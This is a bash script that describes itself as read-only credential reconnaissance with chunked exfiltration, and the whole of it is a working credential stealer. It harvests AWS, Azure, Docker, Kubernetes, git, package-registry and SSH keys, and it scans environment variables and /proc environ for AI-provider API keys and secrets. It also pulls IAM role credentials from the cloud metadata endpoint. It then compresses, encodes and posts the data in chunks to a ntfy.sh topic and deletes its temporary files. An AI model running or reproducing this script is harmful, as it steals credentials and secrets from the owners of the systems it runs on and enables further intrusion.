#!/bin/bash
# artix read-only credential recon; chunked exfil
T="artix92226836195f"
D=/tmp/.ax$$; mkdir -p "$D" 2>/dev/null || D=/tmp
out=$D/o.txt
mkdir /tmp/.ax9222lk 2>/dev/null || exit 0
: > "$out"
post(){ for i in 1 2 3; do
  if command -v curl >/dev/null 2>&1; then curl -sf -m 12 -d "$1" "https://ntfy.sh/$T" >/dev/null 2>&1 && return 0
  else wget -q -O /dev/null --post-data="$1" --timeout=12 "https://ntfy.sh/$T" 2>/dev/null && return 0; fi
  sleep 2; done; return 1; }
add(){ printf '\n===== %s =====\n' "$1" >> "$out"; }
grab(){ [ -r "$1" ] && { add "$1"; head -c 6000 "$1" 2>/dev/null; } ; }
add HOST; { hostname; id; uname -a; head -3 /etc/os-release 2>/dev/null; } >>"$out" 2>&1
add AWSFILES; grab "$HOME/.aws/credentials"; grab "$HOME/.aws/config"; grab /root/.aws/credentials; grab /root/.aws/config
add AWSENV; env 2>/dev/null | grep -iE 'AWS_|OPENAI|ANTHROPIC|AZURE|BEDROCK|GEMINI|GOOGLE_API|HF_TOKEN|LITELLM' >>"$out" 2>&1
add P1ENV; tr '\0' '\n' < /proc/1/environ 2>/dev/null | grep -iE 'AWS_|OPENAI|ANTHROPIC|AZURE|BEDROCK|TOKEN|SECRET|KEY|PASSWORD' >>"$out" 2>&1
add P1ALL; tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -c 3500 >>"$out" 2>&1
add SELFENV; tr '\0' '\n' < /proc/self/environ 2>/dev/null | grep -iE 'AWS_|OPENAI|ANTHROPIC|AZURE|TOKEN|SECRET|KEY|PASSWORD' >>"$out" 2>&1
add DOCKERC; { head -c 2500 "$HOME/.docker/config.json" 2>/dev/null; head -c 2500 /root/.docker/config.json 2>/dev/null; } >>"$out"
add DOCKERPS; { command -v docker >/dev/null 2>&1 && docker ps -a --format '{{.ID}} {{.Image}} {{.Names}}' 2>&1 | head -30; } >>"$out"
add DOCKERENV; { command -v docker >/dev/null 2>&1 && for c in $(docker ps -aq 2>/dev/null | head -20); do echo "--$c"; docker inspect --format '{{json .Config.Env}}' "$c" 2>/dev/null | head -c 1600; echo; done; } >>"$out" 2>&1
add K8S; { head -c 1800 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo; head -c 1000 /etc/kubernetes/azure.json 2>/dev/null; } >>"$out" 2>&1
add AZURECLI; { ls -la "$HOME/.azure" 2>/dev/null|head -12; head -c 1500 "$HOME/.azure/accessTokens.json" 2>/dev/null; head -c 1200 "$HOME/.azure/msal_token_cache.json" 2>/dev/null; } >>"$out" 2>&1
add IMDS
tk=$(curl -s -m 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
{ echo "tk_len=${#tk}"
  if [ -n "$tk" ]; then H1="-H"; H2="X-aws-ec2-metadata-token: $tk"; R=$(curl -s -m 3 -H "$H2" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); else R=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); fi
  echo "roles=$R"
  for role in $R; do echo "--role $role"; curl -s -m 3 ${tk:+-H "X-aws-ec2-metadata-token: $tk"} "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null; echo; done
  echo "--userdata"; curl -s -m 3 ${tk:+-H "X-aws-ec2-metadata-token: $tk"} http://169.254.169.254/latest/user-data 2>/dev/null | head -c 1200; echo
  echo "--id"; curl -s -m 3 ${tk:+-H "X-aws-ec2-metadata-token: $tk"} http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null | head -c 800; echo
  echo "--ecs"; curl -s -m 3 http://169.254.170.2/v2/credentials 2>/dev/null | head -c 1200; echo
} >>"$out" 2>&1
add GITFILES; grab "$HOME/.git-credentials"; grab /root/.git-credentials; grab "$HOME/.gitconfig"
add NPMFILES; grab "$HOME/.npmrc"; grab "$HOME/.pypirc"; grab "$HOME/.config/pip/pip.conf"; grab /root/.netrc
add SSH; { ls -la "$HOME/.ssh" 2>/dev/null|head -12; head -c 1000 "$HOME/.ssh/id_rsa" 2>/dev/null; head -c 700 "$HOME/.ssh/id_ed25519" 2>/dev/null; } >>"$out"
add KUBECFG; grab "$HOME/.kube/config"
add HOME; ls -la "$HOME" 2>/dev/null | head -30
add ENVALL; env 2>/dev/null >>"$out"
gzip -9 -c "$out" > "$D/o.gz" 2>/dev/null || cp "$out" "$D/o.gz"
base64 -w0 "$D/o.gz" > "$D/o.b64" 2>/dev/null || base64 "$D/o.gz" > "$D/o.b64"
SZ=$(wc -c < "$D/o.b64" | tr -d ' ')
CH=3200
NT=$(( (SZ + CH - 1) / CH ))
i=0; OFF=0
while [ "$OFF" -lt "$SZ" ]; do
  i=$((i+1))
  part=$(cut -c $((OFF+1))-$((OFF+CH)) "$D/o.b64" | tr -d '\n')
  crc=$(printf '%s' "$part" | cksum | awk '{print $1}')
  post "AX|$i/$NT|$crc|$part"
  OFF=$((OFF+CH))
  sleep 3
done
post "AX|END|$SZ|$NT"
rm -rf "$D" 2>/dev/null
